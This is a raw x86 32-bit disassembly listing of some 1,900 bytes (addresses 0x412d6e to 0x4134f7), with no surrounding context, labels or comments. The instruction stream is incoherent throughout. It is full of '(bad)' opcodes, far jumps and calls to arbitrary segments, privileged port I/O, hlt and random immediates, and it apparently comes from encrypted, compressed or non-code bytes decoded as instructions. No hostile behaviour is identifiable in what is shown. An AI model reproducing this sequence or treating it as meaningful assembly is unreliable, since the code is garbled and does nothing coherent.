  412d6e:	jne    0x412da7
  412d70:	jb     0x412d31
  412d72:	pop    ebx
  412d73:	daa    
  412d74:	jne    0x412d7e
  412d76:	sub    esi,DWORD PTR [edx+0x11]
  412d79:	xor    ah,BYTE PTR [eax]
  412d7b:	stos   DWORD PTR es:[edi],eax
  412d7c:	pop    ecx
  412d7d:	cmp    ebp,DWORD PTR [esi+0x4c]
  412d80:	push   esi
  412d81:	jmp    0x412d60
  412d83:	push   ecx
  412d84:	xchg   esi,eax
  412d85:	dec    esp
  412d86:	fs loope 0x412d2a
  412d89:	cmp    al,0xa0
  412d8b:	inc    esp
  412d8c:	lock adc ecx,DWORD PTR [ebp+0x78]
  412d90:	pop    esp
  412d91:	sbb    ebx,DWORD PTR [edi]
  412d93:	js     0x412d63
  412d95:	xchg   DWORD PTR [eax],edi
  412d97:	dec    esp
  412d98:	xor    dl,BYTE PTR [ebx]
  412d9a:	adc    BYTE PTR [eax+0x60efa530],dl
  412da0:	push   edx
  412da1:	jp     0x412d30
  412da3:	cmp    al,0xd2
  412da5:	mov    esp,0xc737e3ac
  412daa:	jle    0x412dc2
  412dac:	mov    ds:0x1cf56239,eax
  412db1:	pop    es
  412db2:	mov    dh,0xd
  412db4:	pop    esp
  412db5:	and    eax,0xb30788ff
  412dba:	xor    BYTE PTR [ebp+0x65],ch
  412dbd:	or     ebp,0x1f
  412dc0:	pop    ebx
  412dc1:	scas   eax,DWORD PTR es:[edi]
  412dc2:	nop
  412dc3:	add    BYTE PTR [ecx],0x1c
  412dc6:	dec    ecx
  412dc7:	(bad)  
  412dc8:	je     0x412e36
  412dca:	lock dec esp
  412dcc:	cmp    BYTE PTR [ecx-0x3e6b0609],al
  412dd2:	not    DWORD PTR ds:0xf5494e53
  412dd8:	daa    
  412dd9:	(bad)  
  412dda:	lea    edx,[ebx-0x37]
  412ddd:	arpl   bx,ax
  412ddf:	ja     0x412e01
  412de1:	adc    al,0xbb
  412de3:	sti    
  412de4:	lock ror DWORD PTR [eax],0x5f
  412de8:	inc    esp
  412de9:	push   esi
  412dea:	pop    esp
  412deb:	cmp    BYTE PTR [eax],0x9
  412dee:	cli    
  412def:	mov    al,0x70
  412df1:	mov    edx,0xb2c062c2
  412df6:	push   0x1c1f5a19
  412dfb:	push   ds
  412dfc:	and    eax,0x57e0f03a
  412e01:	in     eax,0x8e
  412e03:	cmp    ebx,DWORD PTR [esi]
  412e05:	mov    fs:0x165e8dbe,al
  412e0b:	inc    eax
  412e0c:	pop    esi
  412e0d:	push   edi
  412e0e:	xchg   edx,esi
  412e10:	push   eax
  412e11:	dec    esp
  412e12:	test   eax,0x4badbe03
  412e17:	or     DWORD PTR [ebp+0x1c],edx
  412e1a:	inc    edi
  412e1b:	dec    ecx
  412e1c:	lods   al,BYTE PTR ds:[esi]
  412e1d:	sbb    bh,BYTE PTR [ecx]
  412e1f:	retf   0x9108
  412e22:	in     eax,dx
  412e23:	ror    BYTE PTR [ebp+0xb],cl
  412e26:	(bad)  
  412e27:	push   0xdb5c36a6
  412e2c:	jbe    0x412e08
  412e2e:	mov    dh,al
  412e30:	outs   dx,BYTE PTR ds:[esi]
  412e31:	dec    ecx
  412e32:	mov    gs,WORD PTR [ecx+0x21a73619]
  412e38:	ins    DWORD PTR es:[edi],dx
  412e39:	outs   dx,BYTE PTR ds:[esi]
  412e3a:	lock ins BYTE PTR es:[edi],dx
  412e3c:	pusha  
  412e3d:	adc    DWORD PTR [eax+ecx*2+0xf28a6cc],0x59
  412e45:	add    DWORD PTR [ecx+0x7e],ebp
  412e48:	dec    edx
  412e49:	mov    ds:0x1d4856af,al
  412e4e:	dec    eax
  412e4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412e50:	adc    al,0x1a
  412e52:	sub    DWORD PTR [eax-0xf],ecx
  412e55:	cmp    cl,BYTE PTR [edx]
  412e57:	mov    eax,0x523a653d
  412e5c:	xchg   esi,eax
  412e5d:	or     bh,ch
  412e5f:	out    0xc5,eax
  412e61:	add    DWORD PTR [edx-0xea3bec2],esi
  412e67:	sbb    dl,ah
  412e69:	(bad)  
  412e6a:	mov    al,0xf8
  412e6c:	in     al,0x5c
  412e6e:	push   ds
  412e6f:	push   edx
  412e70:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412e71:	es test al,0x50
  412e74:	out    0x80,al
  412e76:	xchg   esp,eax
  412e77:	nop
  412e78:	jge    0x412ec8
  412e7a:	(bad)  
  412e7b:	dec    edx
  412e7c:	mov    BYTE PTR [eax],dl
  412e7e:	add    BYTE PTR [ecx-0x6e],cl
  412e81:	test   BYTE PTR [ebp+0x35],0xd0
  412e85:	shr    DWORD PTR [ebx],1
  412e87:	mov    dh,0x7d
  412e89:	retf   
  412e8a:	int3   
  412e8b:	mov    WORD PTR ds:0xe12e451,ss
  412e91:	pop    esp
  412e92:	dec    edx
  412e93:	sub    al,BYTE PTR [ecx]
  412e95:	rol    DWORD PTR [ebx+0x33],1
  412e98:	ret    0x6f3
  412e9b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412e9c:	sahf   
  412e9d:	jp     0x412e73
  412e9f:	pop    eax
  412ea0:	aad    0x59
  412ea2:	mov    al,0x49
  412ea4:	jnp    0x412e5f
  412ea6:	cmp    al,0x26
  412ea8:	push   esi
  412ea9:	lods   al,BYTE PTR ds:[esi]
  412eaa:	ret    
  412eab:	test   DWORD PTR [esi+eax*1-0x5813b9d3],esi
  412eb2:	mov    WORD PTR [edi],cs
  412eb4:	out    dx,al
  412eb5:	sbb    edi,esp
  412eb7:	adc    ah,ah
  412eb9:	xchg   ebp,eax
  412eba:	rol    BYTE PTR [ebp-0x26cd143b],1
  412ec0:	mov    dh,0x4c
  412ec2:	adc    al,0xce
  412ec4:	sbb    DWORD PTR [eax],edx
  412ec6:	sbb    BYTE PTR [esp+ebp*8-0x2c9becae],ch
  412ecd:	cmp    bl,dl
  412ecf:	imul   edi,DWORD PTR [esi],0x60
  412ed2:	test   al,0x51
  412ed4:	les    ebp,FWORD PTR [ebp+0x55]
  412ed7:	dec    edi
  412ed8:	jmp    0x7a62:0xd6bf24ff
  412edf:	(bad)  
  412ee1:	push   edi
  412ee2:	inc    esi
  412ee3:	fld    QWORD PTR [ecx+0x4edda75b]
  412ee9:	pop    es
  412eea:	sbb    al,0xaa
  412eec:	mov    eax,0x4150c5cd
  412ef1:	jecxz  0x412ef7
  412ef3:	and    BYTE PTR [esi+0x73afaa66],bl
  412ef9:	mov    dl,0x50
  412efb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412efc:	stos   BYTE PTR es:[edi],al
  412efd:	xchg   ebp,eax
  412efe:	int    0xa2
  412f00:	fild   QWORD PTR [ebp+0x7dcab8f0]
  412f06:	jle    0x412ed2
  412f08:	inc    ebx
  412f09:	setnp  BYTE PTR [esi-0x3835a209]
  412f10:	push   es
  412f11:	fmul   QWORD PTR [edi+eax*1-0xbd8ce20]
  412f18:	enter  0xf576,0xaf
  412f1c:	mov    ds,WORD PTR [ebx+0x548e2c5e]
  412f22:	ins    DWORD PTR es:[edi],dx
  412f23:	mov    dh,bl
  412f25:	call   0xa851:0x89e4aef5
  412f2c:	add    edi,0x45
  412f2f:	sbb    DWORD PTR [edi],edi
  412f31:	dec    esi
  412f32:	sahf   
  412f33:	leave  
  412f34:	aad    0xbc
  412f36:	sbb    ebx,DWORD PTR [bx-0x58]
  412f3a:	add    eax,0xd3b35c1c
  412f3f:	mov    dh,0x4d
  412f41:	in     al,0xf
  412f43:	jae    0x412fa3
  412f45:	ror    DWORD PTR [ebx+ebx*2],cl
  412f48:	jmp    0x412ee0
  412f4a:	adc    esp,DWORD PTR [eax+0x57f0c418]
  412f50:	xor    DWORD PTR [edx],edi
  412f52:	add    ebp,eax
  412f54:	inc    bl
  412f56:	stos   BYTE PTR es:[edi],al
  412f57:	cdq    
  412f58:	mov    edx,0x6e988532
  412f5d:	pop    ebp
  412f5e:	cmp    al,BYTE PTR [edi+0x5356c40e]
  412f64:	inc    esp
  412f65:	push   esi
  412f66:	adc    ch,BYTE PTR [ebx+0x7cb7acdf]
  412f6c:	dec    ecx
  412f6d:	sbb    BYTE PTR [ebx],ch
  412f6f:	ret    
  412f70:	addr16 ja 0x412f66
  412f73:	cmp    BYTE PTR [eax+eax*4],dl
  412f76:	xchg   ecx,eax
  412f77:	pusha  
  412f78:	out    0xce,eax
  412f7a:	jle    0x412f74
  412f7c:	pop    eax
  412f7d:	sub    eax,0x26cbd389
  412f82:	into   
  412f83:	(bad)  
  412f84:	push   ss
  412f85:	mov    eax,0x8d8fb5c7
  412f8a:	sahf   
  412f8b:	nop
  412f8c:	(bad)  [ebx+ebx*4]
  412f8f:	gs iret 
  412f91:	cmp    esp,DWORD PTR [ebp-0x1f]
  412f94:	pop    ebx
  412f95:	jo     0x413002
  412f97:	xlat   BYTE PTR ds:[ebx]
  412f98:	or     DWORD PTR [eax+0x6aef04c6],ebx
  412f9e:	push   ss
  412f9f:	xchg   edx,eax
  412fa0:	mov    DWORD PTR [esi-0x5227c25d],ecx
  412fa6:	shr    BYTE PTR [ebx+0x51],1
  412fa9:	test   eax,0x5d18315e
  412fae:	jle    0x413024
  412fb0:	adc    eax,0x6d1dc92d
  412fb5:	jne    0x412f7f
  412fb7:	lds    edx,FWORD PTR [eax+0x46]
  412fba:	pop    edi
  412fbb:	sahf   
  412fbc:	sar    BYTE PTR [ecx],1
  412fbe:	inc    esp
  412fbf:	popa   
  412fc0:	repz imul edi,DWORD PTR [ecx-0x56],0x7d20be30
  412fc8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412fc9:	lahf   
  412fca:	pop    ds
  412fcb:	mov    eax,ds:0x426b7e
  412fd0:	mov    eax,DWORD PTR [eax]
  412fd2:	jmp    0x4134dd
  412fd7:	aas    
  412fd8:	(bad)  
  412fd9:	vpmullw ymm1,ymm6,ymm5
  412fdd:	xlat   BYTE PTR ds:[ebx]
  412fde:	(bad)  
  412fdf:	jne    0x412fff
  412fe1:	fs aas 
  412fe3:	jnp    0x412fa9
  412fe5:	(bad)  
  412fe6:	enter  0xc08,0x7f
  412fea:	js     0x413056
  412fec:	jl     0x413066
  412fee:	js     0x413054
  412ff0:	jle    0x412fc0
  412ff2:	int    0xdd
  412ff4:	lock das 
  412ff6:	ror    edx,cl
  412ff8:	mov    dh,0x72
  412ffa:	icebp  
  412ffb:	inc    esi
  412ffc:	jp     0x413064
  412ffe:	and    BYTE PTR [ebp-0x4d2e0529],al
  413004:	or     DWORD PTR [ecx+0x7f8f73a0],ecx
  41300a:	xor    esp,ecx
  41300c:	cwde   
  41300d:	out    dx,eax
  41300e:	or     BYTE PTR [eax-0x19144f0d],dl
  413014:	popf   
  413015:	mov    ds:0x5788e0c7,eax
  41301a:	repz mov dh,BYTE PTR ds:0x2dc0044a
  413021:	jae    0x413036
  413023:	inc    edi
  413024:	mov    eax,0x916bced1
  413029:	and    al,0xa9
  41302b:	mov    bl,0xb3
  41302d:	push   edx
  41302e:	sub    eax,0xffdd30bf
  413033:	pop    edi
  413034:	or     BYTE PTR [ebx-0x6b],ch
  413037:	mov    WORD PTR [eax-0x4f0131d2],cs
  41303d:	cmova  ebp,DWORD PTR [ebp+ebp*2+0x54]
  413042:	xlat   BYTE PTR ds:[ebx]
  413043:	lds    edx,FWORD PTR [esi]
  413045:	jae    0x413089
  413047:	repnz push edx
  413049:	inc    esi
  41304a:	add    al,0x39
  41304c:	sub    BYTE PTR [ebx],al
  41304e:	icebp  
  41304f:	sub    al,0x4
  413051:	cmp    BYTE PTR [esi-0x2],ah
  413054:	sar    ecx,1
  413056:	jbe    0x4130a7
  413058:	and    dl,cl
  41305a:	push   ss
  41305b:	cmp    ebx,esp
  41305d:	inc    edi
  41305e:	rcr    DWORD PTR [edi+0x5e],cl
  413061:	jmp    0x4130a3
  413063:	ins    DWORD PTR es:[edi],dx
  413064:	xor    DWORD PTR [ebp+0x4253bb96],eax
  41306a:	add    eax,0xcb56a138
  41306f:	pop    es
  413070:	cld    
  413071:	(bad)  
  413072:	fdiv   st(0),st
  413074:	sub    ebp,DWORD PTR [ebp-0x7]
  413077:	cmp    BYTE PTR [edx+edi*8+0x654dd4db],cl
  41307e:	jbe    0x413054
  413080:	ins    DWORD PTR es:[edi],dx
  413081:	rcl    BYTE PTR [ebp-0x3bd8b301],0xdd
  413088:	push   0x920a587b
  41308d:	stos   BYTE PTR es:[edi],al
  41308e:	fwait
  41308f:	xor    BYTE PTR [ecx],dh
  413091:	push   cs
  413092:	pop    esi
  413093:	ficomp WORD PTR [edx-0x1ae84b24]
  413099:	mov    esi,0x226a0a9a
  41309e:	out    dx,al
  41309f:	pushf  
  4130a0:	mov    edi,0xf1d73bd8
  4130a5:	cmp    dh,BYTE PTR [eax+0x1e174bde]
  4130ab:	push   ss
  4130ac:	add    dh,BYTE PTR [eax-0x50]
  4130af:	ror    BYTE PTR [ecx-0x4c],0xaf
  4130b3:	xor    al,0x61
  4130b5:	or     al,0x7a
  4130b7:	cmp    al,0x1
  4130b9:	jl     0x4130ee
  4130bb:	nop
  4130bc:	aam    0x5b
  4130be:	(bad)  
  4130bf:	fst    st(2)
  4130c1:	rcl    DWORD PTR [edx],0x35
  4130c4:	pop    ds
  4130c5:	xchg   DWORD PTR [ebx-0x749dd9ed],esi
  4130cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4130cc:	cmp    dl,BYTE PTR ds:0xfdea0821
  4130d2:	inc    edx
  4130d3:	inc    edx
  4130d4:	imul   ebp,DWORD PTR [edi],0x6a
  4130d7:	mov    bh,0xf1
  4130d9:	pop    ebx
  4130da:	jae    0x4130fb
  4130dc:	add    al,0x72
  4130de:	push   esp
  4130df:	adc    ah,dl
  4130e1:	mov    esp,0xc02bb273
  4130e6:	xchg   ebp,eax
  4130e7:	aas    
  4130e8:	and    DWORD PTR [edi],ebx
  4130ea:	aad    0xef
  4130ec:	adc    esp,DWORD PTR [ebp-0x35fcbbfb]
  4130f2:	repnz xor al,ah
  4130f5:	in     eax,0x81
  4130f7:	cdq    
  4130f8:	gs xchg ecx,eax
  4130fa:	test   al,0x39
  4130fc:	sub    DWORD PTR [edi-0x18],0xc8ac2a6c
  413103:	dec    esp
  413104:	not    BYTE PTR [ebp-0x68944602]
  41310a:	sbb    BYTE PTR [ebp-0x377e7a75],dh
  413110:	les    eax,FWORD PTR [ebp+0x7]
  413113:	adc    eax,DWORD PTR [esi+eiz*1]
  413116:	pop    esi
  413117:	sub    edi,ebp
  413119:	mov    esp,0x7e1e35da
  41311e:	(bad)  
  41311f:	out    0xc1,al
  413121:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413123:	imul   edx,DWORD PTR [esi+0x1a],0x1f33b962
  41312a:	sbb    eax,0x23bbf9b5
  41312f:	test   BYTE PTR [esi+0x6d],ch
  413132:	fwait
  413133:	loopne 0x41310f
  413135:	(bad)  
  413136:	stc    
  413137:	or     al,0x18
  413139:	fstp   st(6)
  41313b:	lahf   
  41313c:	aad    0x99
  41313e:	popa   
  41313f:	aaa    
  413140:	addr16 int3 
  413142:	data16 aad 0xa2
  413145:	push   cs
  413146:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413147:	or     bl,dh
  413149:	jae    0x4130f2
  41314b:	adc    BYTE PTR [ebp+0x71],0xa5
  41314f:	push   ds
  413150:	cli    
  413151:	out    0x7c,al
  413153:	in     al,0xcf
  413155:	jecxz  0x4130ee
  413157:	pushf  
  413158:	test   DWORD PTR [ecx+0x3e],ebp
  41315b:	and    BYTE PTR [esi-0x57],cl
  41315e:	ds mov ds,esi
  413161:	icebp  
  413162:	and    bl,al
  413164:	sahf   
  413165:	push   es
  413166:	inc    ebx
  413167:	pop    ecx
  413168:	add    dh,BYTE PTR [edx+0x29c65e6]
  41316e:	sahf   
  41316f:	add    eax,0x9b60e72a
  413174:	lods   al,BYTE PTR ds:[esi]
  413175:	clc    
  413176:	out    dx,al
  413177:	test   al,0xd1
  413179:	leave  
  41317a:	inc    ebp
  41317b:	inc    ch
  41317d:	sbb    BYTE PTR gs:[eax-0x73725cc1],ch
  413184:	xchg   esi,eax
  413185:	inc    ebx
  413186:	imul   esp,DWORD PTR [eax+0x25cf1f53],0x337ad7b8
  413190:	adc    esp,DWORD PTR ds:[eax]
  413193:	xchg   esi,eax
  413194:	xor    ch,BYTE PTR [edx-0x46]
  413197:	dec    ecx
  413198:	je     0x4131e5
  41319a:	pusha  
  41319b:	adc    DWORD PTR [esi-0x29],eax
  41319e:	leave  
  41319f:	sub    ecx,DWORD PTR [eax+0x4d19f25]
  4131a5:	cmp    eax,0x2ce4d0f9
  4131aa:	adc    BYTE PTR [ebp+0x1e23aa85],al
  4131b0:	js     0x413178
  4131b2:	ins    BYTE PTR es:[edi],dx
  4131b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4131b4:	in     eax,dx
  4131b5:	lods   eax,DWORD PTR ds:[esi]
  4131b6:	pop    edx
  4131b7:	jl     0x413196
  4131b9:	inc    edi
  4131ba:	sahf   
  4131bb:	adc    eax,0x81b3320e
  4131c0:	pop    esi
  4131c1:	xchg   ebx,eax
  4131c2:	sub    bh,BYTE PTR [edx+0x35]
  4131c5:	cld    
  4131c6:	scas   eax,DWORD PTR es:[edi]
  4131c7:	fsub   QWORD PTR [edx+0x1c0bf564]
  4131cd:	and    bh,dh
  4131cf:	into   
  4131d0:	mov    dh,0x55
  4131d2:	int    0xb0
  4131d4:	clc    
  4131d5:	sbb    DWORD PTR [edx],esi
  4131d7:	adc    BYTE PTR [edx+0x4ed029c1],bl
  4131dd:	push   ebp
  4131de:	icebp  
  4131df:	ja     0x413202
  4131e1:	sbb    al,dl
  4131e3:	lods   al,BYTE PTR ds:[esi]
  4131e4:	out    dx,eax
  4131e5:	adc    al,0x27
  4131e7:	call   0x8866:0x624adef8
  4131ee:	test   DWORD PTR [edx],edi
  4131f0:	dec    ebx
  4131f1:	hlt    
  4131f2:	dec    edi
  4131f3:	mov    ss,WORD PTR ds:0x436be4dd
  4131f9:	push   ebp
  4131fa:	mov    WORD PTR [edx+0x61],ds
  4131fd:	leave  
  4131fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4131ff:	cmp    ch,BYTE PTR [ebx-0x7bf93b62]
  413205:	sbb    BYTE PTR [esi-0x2d],dl
  413208:	fdiv   QWORD PTR [ebp+0x33]
  41320b:	push   ebx
  41320c:	in     eax,0x22
  41320e:	pop    esp
  41320f:	or     cl,BYTE PTR [esi]
  413211:	sub    BYTE PTR [esi+0x3c],al
  413214:	add    al,0xdf
  413216:	loopne 0x413267
  413218:	lds    esi,FWORD PTR [eax]
  41321a:	cmp    ecx,esp
  41321c:	cmp    al,0xd9
  41321e:	sub    al,0x1b
  413220:	or     cl,dl
  413222:	sub    BYTE PTR ds:0x857b32f9,cl
  413228:	test   al,bl
  41322a:	mov    ecx,0xb20e5087
  41322f:	test   eax,0x878995e1
  413234:	shl    DWORD PTR [edi-0x718e2a6e],0x0
  41323b:	les    ebp,FWORD PTR [eax+0x768dee7a]
  413241:	xchg   edi,eax
  413242:	test   DWORD PTR [ecx+0x3c],ebp
  413245:	add    BYTE PTR [ebx+0x6],0xa3
  413249:	sbb    BYTE PTR [eax],ah
  41324b:	lock lods eax,DWORD PTR ds:[esi]
  41324d:	daa    
  41324e:	lock icebp 
  413250:	(bad)  
  413251:	icebp  
  413252:	xchg   esp,eax
  413253:	shl    BYTE PTR [eax+0x3f],0x9d
  413257:	jmp    0xdec8:0xdbee11b1
  41325e:	lods   eax,DWORD PTR ds:[esi]
  41325f:	aas    
  413260:	ficom  DWORD PTR [ebx-0x5]
  413263:	mov    BYTE PTR [ebx+0x6a],al
  413266:	adc    DWORD PTR [edi+ecx*8+0x46],edx
  41326a:	push   ebx
  41326b:	test   DWORD PTR [ecx+ecx*2+0x4b5f1879],eax
  413272:	jecxz  0x4132d8
  413274:	add    eax,0x2532af4d
  413279:	das    
  41327a:	xchg   ebp,eax
  41327b:	out    0xb1,eax
  41327d:	jbe    0x4132e4
  41327f:	sub    al,0x4b
  413281:	cdq    
  413282:	test   DWORD PTR [edx+0x13],edi
  413285:	inc    esi
  413286:	into   
  413287:	test   dh,cl
  413289:	inc    ecx
  41328a:	push   ebx
  41328b:	jnp    0x41328d
  41328d:	outs   dx,DWORD PTR ds:[esi]
  41328e:	add    ebx,ebx
  413290:	out    0x6e,al
  413292:	ins    DWORD PTR es:[edi],dx
  413293:	addr16 mov ds:0x8af3,eax
  413297:	call   0x2e9f:0x5b245ba6
  41329e:	shl    DWORD PTR [eax],0x23
  4132a1:	pop    eax
  4132a2:	xor    ecx,0x32
  4132a5:	fdivr  DWORD PTR [eax+0x11]
  4132a8:	xchg   edi,eax
  4132a9:	pavgw  mm0,mm6
  4132ac:	mov    al,ds:0x71cd5c8c
  4132b1:	or     DWORD PTR [esi],ecx
  4132b3:	sub    ebp,0xffffff88
  4132b6:	xlat   BYTE PTR ds:[ebx]
  4132b7:	or     eax,0x7a7faba4
  4132bc:	ja     0x41329c
  4132be:	into   
  4132bf:	nop
  4132c0:	bound  ebx,QWORD PTR [ebx-0x7c]
  4132c3:	jns    0x41324b
  4132c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4132c6:	pop    ebx
  4132c7:	push   edi
  4132c8:	xchg   bx,ax
  4132ca:	fucomip st,st(0)
  4132cc:	pushf  
  4132cd:	pop    ebp
  4132ce:	sub    eax,0xd94070b9
  4132d3:	daa    
  4132d4:	dec    ebp
  4132d5:	pop    eax
  4132d6:	iret   
  4132d7:	out    0xb2,al
  4132d9:	cmc    
  4132da:	mov    eax,ds:0x44d81622
  4132df:	paddw  mm4,QWORD PTR [edi+0x33073541]
  4132e6:	xlat   BYTE PTR ds:[ebx]
  4132e7:	inc    ebx
  4132e8:	sub    eax,0xc8cd6b70
  4132ed:	fwait
  4132ee:	pop    ebx
  4132ef:	cmc    
  4132f0:	sbb    al,0x35
  4132f2:	rcl    BYTE PTR [edx-0x2e54de1e],0x6a
  4132f9:	jmp    0x413367
  4132fb:	sbb    esi,DWORD PTR [esi]
  4132fd:	aaa    
  4132fe:	lods   al,BYTE PTR ds:[esi]
  4132ff:	xchg   ebp,eax
  413300:	mov    edi,0xe889a85e
  413305:	aas    
  413306:	add    al,0xaa
  413308:	xchg   DWORD PTR [eax-0x7cb12416],esi
  41330e:	cmp    eax,0x95f67b11
  413313:	(bad)  
  413314:	lahf   
  413315:	(bad)  
  413316:	jno    0x41338e
  413318:	mov    ah,0xe0
  41331a:	mov    ah,0x41
  41331c:	xchg   ebx,eax
  41331d:	sahf   
  41331e:	(bad)  
  41331f:	push   ecx
  413320:	pop    edx
  413321:	sbb    eax,0x4f99154e
  413326:	mov    ecx,0x6ccae099
  41332b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41332c:	nop
  41332d:	push   es
  41332e:	cmp    BYTE PTR [edx-0x1fe2359b],dl
  413334:	sub    eax,0x4208333b
  41333a:	daa    
  41333b:	mov    al,bh
  41333d:	test   DWORD PTR [edi+eax*4+0xee550aa],esi
  413344:	push   es
  413345:	rcl    BYTE PTR [di-0x263],0x3f
  41334b:	ror    DWORD PTR [esp+eax*8+0x75eac292],1
  413352:	jge    0x413310
  413354:	cdq    
  413355:	jl     0x41336a
  413357:	ficom  DWORD PTR [esi+esi*1-0xe211f1b]
  41335e:	sub    ebp,DWORD PTR [ebx+0x3705053]
  413364:	mov    al,ds:0x30cdf8f5
  413369:	sub    ah,bl
  41336b:	inc    eax
  41336c:	mov    dh,0xf
  41336e:	jl     0x413307
  413370:	adc    DWORD PTR [ebx],ebp
  413372:	jb     0x413365
  413374:	push   0x2e255380
  413379:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41337a:	ins    BYTE PTR es:[edi],dx
  41337b:	dec    ebp
  41337c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41337d:	pop    ds
  41337e:	fdiv   DWORD PTR [edx]
  413380:	sub    BYTE PTR [ecx+ebp*2-0x1a455df3],ch
  413387:	nop
  413388:	js     0x41335c
  41338a:	add    DWORD PTR [edx],edi
  41338c:	mov    es,WORD PTR [edx-0x68]
  41338f:	xchg   BYTE PTR [ecx],ch
  413391:	push   edx
  413392:	lods   al,BYTE PTR ds:[esi]
  413393:	(bad)  
  413394:	mov    al,al
  413396:	das    
  413397:	add    edx,DWORD PTR [edi-0x35]
  41339a:	retf   
  41339b:	ret    
  41339c:	inc    esi
  41339d:	data16 stos BYTE PTR es:[edi],al
  41339f:	in     al,dx
  4133a0:	mov    dh,0xa9
  4133a2:	bound  edx,QWORD PTR [esi+ecx*2]
  4133a5:	mov    dh,0x9f
  4133a7:	aad    0x6f
  4133a9:	mov    al,ds:0xcc7122a6
  4133ae:	popf   
  4133af:	cmp    bh,0xd6
  4133b2:	fadd   st(2),st
  4133b4:	push   0x7ae5b387
  4133b9:	cmp    DWORD PTR fs:[edi-0x64],edi
  4133bd:	hlt    
  4133be:	ret    
  4133bf:	stos   BYTE PTR es:[edi],al
  4133c0:	mov    cl,0xeb
  4133c2:	xlat   BYTE PTR ds:[ebx]
  4133c3:	jg     0x413422
  4133c5:	sub    dl,BYTE PTR [edx]
  4133c7:	aas    
  4133c8:	add    dl,BYTE PTR [edx-0x4655f664]
  4133ce:	mov    esp,0x475aa344
  4133d3:	icebp  
  4133d4:	or     DWORD PTR [eax+0x68],esp
  4133d7:	stc    
  4133d8:	retf   0xc033
  4133db:	gs shl ebp,cl
  4133de:	xchg   edi,eax
  4133df:	out    0xb7,eax
  4133e1:	mov    cl,0x72
  4133e3:	jmp    0x413401
  4133e5:	ss in  al,0x8a
  4133e8:	lahf   
  4133e9:	jns    0x41336d
  4133eb:	leave  
  4133ec:	sub    BYTE PTR [edx+0x5c],ch
  4133ef:	inc    esp
  4133f0:	inc    ebp
  4133f1:	int    0xf1
  4133f3:	mov    edi,0xa31ebbce
  4133f8:	ret    
  4133f9:	sub    ebx,DWORD PTR [edi+ebx*4]
  4133fc:	inc    edx
  4133fd:	sbb    dl,0x7b
  413400:	mov    esi,0x65c114f9
  413405:	adc    bl,BYTE PTR [esi]
  413407:	and    al,0x31
  413409:	in     al,dx
  41340a:	and    dl,bh
  41340c:	or     ecx,DWORD PTR [esi]
  41340e:	sbb    edx,DWORD PTR [esi-0x3ecbeb9f]
  413414:	scas   eax,DWORD PTR es:[edi]
  413415:	pop    ds
  413416:	cmp    eax,0x57c48785
  41341b:	jl     0x4133fa
  41341d:	fimul  WORD PTR [ebp-0x69]
  413420:	test   BYTE PTR [eax],0xc2
  413423:	clc    
  413424:	in     eax,0x80
  413426:	les    esi,FWORD PTR [edx-0x22]
  413429:	jno    0x41341a
  41342b:	test   ebp,ebp
  41342d:	gs push 0xf6619b10
  413433:	mov    ecx,0xb629bab6
  413438:	adc    DWORD PTR [ebp+ebx*4+0x40],0xffffffd9
  41343d:	xor    dl,BYTE PTR [ebx]
  41343f:	mov    edi,0xd66c5965
  413444:	and    eax,0xfcd5f608
  413449:	ins    DWORD PTR es:[edi],dx
  41344a:	stc    
  41344b:	sub    ebp,edx
  41344d:	ins    DWORD PTR es:[edi],dx
  41344e:	cmc    
  41344f:	cmp    al,0xdc
  413451:	xor    DWORD PTR [esi+0x5a2cb47f],esp
  413457:	push   ds
  413458:	sub    BYTE PTR [ebp-0x7bc11ce4],ah
  41345e:	mov    cl,BYTE PTR [edx-0x3202e14f]
  413464:	lds    esi,FWORD PTR [eax+0x23]
  413467:	pop    ss
  413468:	xchg   ebp,eax
  413469:	and    BYTE PTR [ebp+edi*2+0x4da6fc4e],ch
  413470:	loop   0x413423
  413472:	mov    BYTE PTR [edx+0x56],bl
  413475:	inc    ebx
  413476:	cmp    ebx,DWORD PTR [eax+0x75]
  413479:	shr    BYTE PTR [edx-0x21f401b6],cl
  41347f:	div    DWORD PTR [eax+0x4d6a932a]
  413485:	out    0x43,eax
  413487:	outs   dx,BYTE PTR ds:[esi]
  413488:	aaa    
  413489:	sbb    DWORD PTR [eax-0x29d33d94],edi
  41348f:	xchg   edx,eax
  413490:	cmp    al,0x6c
  413492:	adc    BYTE PTR [ecx-0x538233bb],ch
  413498:	mov    ch,0xc2
  41349a:	add    eax,0xb9fdd65b
  41349f:	pusha  
  4134a0:	jecxz  0x41345f
  4134a2:	in     eax,dx
  4134a3:	dec    edx
  4134a4:	add    DWORD PTR [edx-0x6d623430],edx
  4134aa:	call   0x93a778b
  4134af:	adc    ecx,DWORD PTR [esi]
  4134b1:	or     BYTE PTR [eax],bl
  4134b3:	push   es
  4134b4:	jb     0x4134bc
  4134b6:	clc    
  4134b7:	call   0x3875:0xacb32f56
  4134be:	adc    edx,edi
  4134c0:	int    0x3
  4134c2:	hlt    
  4134c3:	xchg   BYTE PTR [ebp*4+0x16497c],cl
  4134ca:	retf   0x60b
  4134cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4134ce:	xor    BYTE PTR [ebx-0x10],cl
  4134d1:	daa    
  4134d2:	imul   ecx,DWORD PTR [ecx-0x248f59c9],0x40a1d7e3
  4134dc:	and    al,0xff
  4134de:	xor    BYTE PTR [ebp+0x426b9a05],cl
  4134e4:	add    bh,bh
  4134e6:	xor    cl,ch
  4134e8:	push   es
  4134e9:	add    eax,0x3c3c0000
  4134ee:	rol    eax,cl
  4134f0:	rcl    edi,cl
  4134f2:	fcmovnb st,st(4)
  4134f4:	mov    DWORD PTR [edx],edx
  4134f6:	inc    edi
  4134f7:	ror    BYTE PTR [ebp+eiz*4+0x107aa798],1
